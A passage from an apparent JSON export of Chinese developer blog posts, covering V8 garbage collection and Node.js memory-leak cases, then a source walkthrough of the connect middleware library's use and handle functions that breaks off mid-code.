(打扫)\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003e特点：牺牲空间换时间\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e将堆内存一分为二，一个处于使用中，一个处于闲置。\u003cbr\u003e检查使用中空间的存活对象，将存活对象复制到闲置空间中。\u003cbr\u003e完成复制后闲置空间和使用中空间角色互换。\u003cbr\u003e当一个对象经过多次复制依然存活时，它会被认为是生命周期较长的对象，会被晋升到老生代中。\u003cbr\u003e晋升的条件有两个，一个是对象是否经历过Scavenge回收，一个是空闲空间的内存占用比超过25%。（为何不是50%呢？）\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e缺点：只能使用一半的堆空间，适合应用在新生代中。\u003c/p\u003e\u003c/blockquote\u003e\u003c/li\u003e\u003cli\u003e\u003cp\u003eMark-Sweep \u0026amp; Mark-Compact (标记清除 \u0026amp; 标记整理)\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003eMark-Sweep遍历堆中的所有对象，标记活着的对象。\u003cbr\u003e在清除阶段清除所有没有被标记的对象。\u003cbr\u003e缺点在于内存空间会出现不连续的状态。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003eMark-Compact与Mark-Sweep的差别在于，在整理过程中，将活着的对象往一端移动，然后清理掉边界外的内存。\u003c/p\u003e\u003c/blockquote\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e速度： Scavenge\u0026gt;Mark-Sweep\u0026gt;Mark-Compact\u003c/p\u003e\u003col\u003e\u003cli\u003e\u003cp\u003eIncremental Marking (增量标记)\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003e前三种算法都需要将应用逻辑暂停，待垃圾回收完成后再恢复，即“全停顿”。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e新生代较小，全停顿影响不大。但老生代很大，全停顿影响很大。\u003c/p\u003e\u003c/blockquote\u003e\u003cblockquote\u003e\u003cp\u003e为降低影响，将标记阶段改为增量标记，也就是将标记拆分为很多小标记，每做完一步就让js逻辑执行一会儿，垃圾回收与JS逻辑交替执行。\u003c/p\u003e\u003c/blockquote\u003e\u003c/li\u003e\u003cli\u003e\u003cp\u003elazy sweeping \u0026amp; incremental compaction 等\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003ch2\u003e内存泄漏\u003c/h2\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e常见原因\n1.缓存\n2.队列消费不及时    \n3.作用域未释放\u003c/code\u003e\u003c/pre\u003e\u003ch4\u003ecase1 : 缓存\u003c/h4\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar cache = {};\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (key, value){\n    cache[key] = value;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4\u003ecase2 : 无限增长数组\u003c/h4\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr = [];\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e x (value){\n    arr.push(value);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4\u003ecase3: 无限重连导致的内存泄漏\u003c/h4\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst net = require(\u003cspan class=\"hljs-string\"\u003e'net'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e client = new net.Socket();\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003econnect\u003c/span\u003e\u003c/span\u003e() {\n    client.connect(26665, \u003cspan class=\"hljs-string\"\u003e'127.0.0.1'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecallbackListener\u003c/span\u003e\u003c/span\u003e() {\n    console.log(\u003cspan class=\"hljs-string\"\u003e'connected!'\u003c/span\u003e);\n});\n}\n\n//第一次连接\nconnect();\n\nclient.on(\u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (error) {\n    // console.error(error.message);\n});\n\nclient.on(\u003cspan class=\"hljs-string\"\u003e'close'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    //console.error(\u003cspan class=\"hljs-string\"\u003e'closed!'\u003c/span\u003e);\n    //泄漏代码\n    client.destroy();\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(connect, 1);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e泄漏产生的原因其实也很简单：event.js 核心模块实现的事件发布/订阅本质上是一个js对象结构（在v6版本中为了性能采用了new EventHandles()，并且把EventHandles的原型置为null来节省原型链查找的消耗），因此我们每一次调用 event.on 或者 event.once 相当于在这个对象结构中对应的 type 跟着的数组增加一个回调处理函数。\u003c/p\u003e\u003cp\u003e那么这个例子里面的泄漏属于非常隐蔽的一种：net 模块的重连每一次都会给 client 增加一个 connect事件 的侦听器，如果一直重连不上，侦听器会无限增加，从而导致泄漏。\u003c/p\u003e\u003ch4\u003ecase4: 小测试\u003c/h4\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e泄漏了吗？\nvar run = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n  var str = new Array(1000000).join(\u003cspan class=\"hljs-string\"\u003e'*'\u003c/span\u003e);\n  var \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003eSomethingWithStr = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (str === \u003cspan class=\"hljs-string\"\u003e'something'\u003c/span\u003e)\n      console.log(\u003cspan class=\"hljs-string\"\u003e\"str was something\"\u003c/span\u003e);\n  };\n  \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003eSomethingWithStr();\n};\n\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eInterval(run, 1000);\n\u003c/code\u003e\u003c/pre\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e泄漏了吗？\nvar run = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n  var str = new Array(1000000).join(\u003cspan class=\"hljs-string\"\u003e'*'\u003c/span\u003e);\n  var \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003eIt = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    console.log(\u003cspan class=\"hljs-string\"\u003e'interval'\u003c/span\u003e);\n  };\n  \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eInterval(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003eIt, 100);\n};\n\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eInterval(run, 1000);\n\u003c/code\u003e\u003c/pre\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e泄漏了吗？\nvar run = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n  var str = new Array(1000000).join(\u003cspan class=\"hljs-string\"\u003e'*'\u003c/span\u003e);\n  var \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003eSomethingWithStr = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (str === \u003cspan class=\"hljs-string\"\u003e'something'\u003c/span\u003e)\n      console.log(\u003cspan class=\"hljs-string\"\u003e\"str was something\"\u003c/span\u003e);\n  };\n  \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003eSomethingWithStr();\n  var \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003eIt = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    console.log(\u003cspan class=\"hljs-string\"\u003e'interval'\u003c/span\u003e);\n  }\n  \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eInterval(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003eIt, 100);\n};\n\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eInterval(run, 1000);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e一旦一个变量被任一个闭包使用了，它会在所有的闭包词法环境结束之后才被释放，这会导致内存泄漏。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1515151202.3702","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98fd"},"id":"5a4f0aeef265da3e32454a0b","author":{"$oid":"5a4b76a1b11e1a170cb138d0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"深入理解connect/express","meta":{"likeCount":0},"tag":["Express","前端","koa","设计模式"],"comment":[],"shortContent":"其实关于这个话题之前已经提到过了, 也写过一篇关于express和koa对比的文章, 但是现在回过头看, 其实还是挺多错误的地方, 比如关于express和koa中间件原理的部分陷入了一个陷阱, 当时也研究了挺久但是没怎么理解. 关于这部分其实就是对于设计模式的欠缺了. 关于中…","content":"\u003cp\u003e其实关于这个话题之前已经提到过了, 也写过一篇关于express和koa对比的文章, 但是现在回过头看, 其实还是挺多错误的地方, 比如关于express和koa中间件原理的部分陷入了一个陷阱, 当时也研究了挺久但是没怎么理解. 关于这部分其实就是对于设计模式的欠缺了. 关于中间件模式我们不说那么多概念或者实现了, 针对代码说话.\u003c/p\u003e\n\u003cp\u003e柿子当然挑软的捏, express的代码量不算大, 但是有个更加简单的connect, 我们就从connect入手吧.\u003c/p\u003e\n\u003cp\u003e花了点时间画了个示意图, 但是之前没怎么画过代码流程图, 意思一下而已:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4c2acd1c2676?w=702\u0026amp;h=650\u0026amp;f=png\u0026amp;s=62188\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e代码分析\u003c/h2\u003e\n\u003cp\u003e首先我们看看connect是怎么使用的:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e connect = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'connect'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = connect()\n\napp.use(\u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res, next\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'全局中间件'\u003c/span\u003e)\n  next()\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'执行完了'\u003c/span\u003e)\n})\n\napp.use(\u003cspan class=\"hljs-string\"\u003e'/bar'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'第二个中间件'\u003c/span\u003e)\n  res.end(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e)\n})\n\napp.listen(\u003cspan class=\"hljs-number\"\u003e8001\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e跟express类似, 新建实例, 匹配路由, 很简洁也很有效. 上面代码执行访问后我们发现其实next后还是会回来执行下面的代码的, 似乎跟koa的中间件有点类似, 号称洋葱型中间件嘛. 结论是否定的, 反正这里不是与koa进行对比.\u003c/p\u003e\n\u003cp\u003e梳理一下代码结构吧:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e proto = {}\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e createServer = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{}\n\nproto.use = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{}\n\nproto.handle = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{}\n\nproto.listen = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e主要就是上面这几个函数, 其他辅助函数我们砍掉.  可以看到我们用connect主要就是在proto这块, 让我们根据代码来看我们启动一个connect服务器到底发生了哪些事情.\u003c/p\u003e\n\u003cp\u003e首先我们是新建一个connect实例:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e app = connect()\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e毫无疑问调用的是\u003ccode\u003ecreateServer\u003c/code\u003e, 因为这个模块最终导出的就是它嘛, \u003ccode\u003ecreateServer\u003c/code\u003e部分的代码也很简单:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecreateServer\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eapp\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res, next\u003c/span\u003e)\u003c/span\u003e{ app.handle(req, res, next); }\n  merge(app, proto); \u003cspan class=\"hljs-comment\"\u003e// 继承了proto\u003c/span\u003e\n  merge(app, EventEmitter.prototype); \u003cspan class=\"hljs-comment\"\u003e// 继承了EventEmitter\u003c/span\u003e\n  app.route = \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e;\n  app.stack = []; \u003cspan class=\"hljs-comment\"\u003e// 暂存路由和方法的地方\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e app;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面有用的部分我已经标出来了, 可以看出来其实我们那些常用的connect方法都来自proto, 那么我们下面主要工作就围绕着proto来.\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eapp.use\u003c/h3\u003e\n\u003cp\u003e当我们想设置某个路由的时候就是调用\u003ccode\u003eapp.use\u003c/code\u003e, 但是可能大家并不太清楚他具体做了什么事情, 比如下面的代码:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eapp.use(\u003cspan class=\"hljs-string\"\u003e'/bar'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) \u003c/span\u003e{\n  res.end(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e)\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面已经讲了, 有个stack数组是专门用来存放路由和他的方法的, 很容易的就能想到: \u003ccode\u003eapp.use\u003c/code\u003e就是将我们想的路由和方法推进去等待执行, 实际上也是这样的:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eproto.use = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003euse\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eroute, fn\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e handle = fn;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e path = route;\n\n  \u003cspan class=\"hljs-comment\"\u003e// default route to '/'\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e route !== \u003cspan class=\"hljs-string\"\u003e'string'\u003c/span\u003e) {\n    handle = route;\n    path = \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e;\n  }\n\n  \u003cspan class=\"hljs-comment\"\u003e// wrap sub-apps\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e handle.handle === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e server = handle;\n    server.route = path;\n    handle = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res, next\u003c/span\u003e) \u003c/span\u003e{\n      server.handle(req, res, next);\n    };\n  }\n\n  \u003cspan class=\"hljs-comment\"\u003e// wrap vanilla http.Servers\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (handle \u003cspan class=\"hljs-keyword\"\u003einstanceof\u003c/span\u003e http.Server) {\n    handle = handle.listeners(\u003cspan class=\"hljs-string\"\u003e'request'\u003c/span\u003e)[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n  }\n\n  \u003cspan class=\"hljs-comment\"\u003e// strip trailing slash\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (path[path.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e) {\n    path = path.slice(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e);\n  }\n\n  \u003cspan class=\"hljs-comment\"\u003e// add the middleware\u003c/span\u003e\n  debug(\u003cspan class=\"hljs-string\"\u003e'use %s %s'\u003c/span\u003e, path || \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e, handle.name || \u003cspan class=\"hljs-string\"\u003e'anonymous'\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.stack.push({ \u003cspan class=\"hljs-attr\"\u003eroute\u003c/span\u003e: path, \u003cspan class=\"hljs-attr\"\u003ehandle\u003c/span\u003e: handle });\n\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看上去蛮复杂的, 我们简化一下, 不考虑各种异常以及兼容, 默认只能\u003ccode\u003eapp.use(route, handle)\u003c/code\u003e调用:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 很好嘛 把if都给去掉了就是简化2333\u003c/span\u003e\nproto.use = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003euse\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eroute, fn\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e handle = fn;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e path = route;\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.stack.push({ \u003cspan class=\"hljs-attr\"\u003eroute\u003c/span\u003e: path, \u003cspan class=\"hljs-attr\"\u003ehandle\u003c/span\u003e: handle });\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e简化后是不是顺眼多了, 其实就是维护数组, 当然这样肯定有问题的, 重复路由什么的就不管了.\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e中间件的实现\u003c/h3\u003e\n\u003cp\u003e那use实现后其实我们就有点数了, 中间件现在都在stack里, 那我们执行中间件就是针对具体路由来遍历这个stack嘛, 对的, 就是遍历stack, 但是connect的中间件事顺序执行的, 如果一个个排下来就是所有中间件都会执行一遍, 可能的情况就是比如一个异常处理的中间件, 我只要在出现异常的时候才需要调用这个中间件.这时候\u003ccode\u003enext\u003c/code\u003e就上场了, 首先来看看proto.handle实现的几十行代码吧:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eproto.handle = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ehandle\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res, out\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e index = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e protohost = getProtohost(req.url) || \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e removed = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e slashAdded = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e stack = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.stack;\n\n  \u003cspan class=\"hljs-comment\"\u003e// final function handler\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e done = out || finalhandler(req, res, {\n    \u003cspan class=\"hljs-attr\"\u003eenv\u003c/span\u003e: env,\n    \u003cspan class=\"hljs-attr\"\u003eonerror\u003c/span\u003e: logerror\n  });\n\n  \u003cspan class=\"hljs-comment\"\u003e// store the original URL\u003c/span\u003e\n  req.originalUrl = req.originalUrl || req.url;\n\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003enext\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (slashAdded) {\n      req.url = req.url.substr(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n      slashAdded = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (removed.length !== \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n      req.url = protohost + removed + req.url.substr(protohost.length);\n      removed = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// next callback\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e layer = stack[index++];\n\n    \u003cspan class=\"hljs-comment\"\u003e// all done\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!layer) {\n      defer(done, err);\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// route data\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e path = parseUrl(req).pathname || \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e route = layer.route;\n\n    \u003cspan class=\"hljs-comment\"\u003e// skip this layer if the route doesn't match\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (path.toLowerCase().substr(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, route.length) !== route.toLowerCase()) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e next(err);\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// skip if route match does not border \"/\", \".\", or end\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e c = path.length \u0026gt; route.length \u0026amp;\u0026amp; path[route.length];\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (c \u0026amp;\u0026amp; c !== \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u0026amp;\u0026amp; c !== \u003cspan class=\"hljs-string\"\u003e'.'\u003c/span\u003e) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e next(err);\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// trim off the part of the url that matches the route\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (route.length !== \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026amp;\u0026amp; route !== \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e) {\n      removed = route;\n      req.url = protohost + req.url.substr(protohost.length + removed.length);\n\n      \u003cspan class=\"hljs-comment\"\u003e// ensure leading slash\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!protohost \u0026amp;\u0026amp; req.url[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] !== \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e) {\n        req.url = \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e + req.url;\n        slashAdded = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n      }\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// call the layer handle\u003c/span\u003e\n    call(layer.handle, route, err, req, res, next);\n  }\n\n  next();\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e还是挺长的, 需要简化, 同理我们把if都给去掉简化代码:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eproto.handle = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ehandle\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res, out\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e index = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e protohost = getProtohost(req.url) || \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e removed = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e slashAdded = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e stack = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.stack;\n\n  \u003cspan class=\"hljs-comment\"\u003e// final function handler\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e done = out || finalhandler(req, res, {\n    \u003cspan class=\"hljs-attr\"\u003eenv\u003c/span\u003e: env,\n    \u003cspan class=\"hljs-attr\"\u003eonerror\u003c/span\u003e: logerror\n  });\n\n  \u003cspan class=\"hljs-comment\"\u003e// store the original URL\u003c/span\u003e\n  req.originalUrl = req.originalUrl || req.url;\n\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003enext\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e) 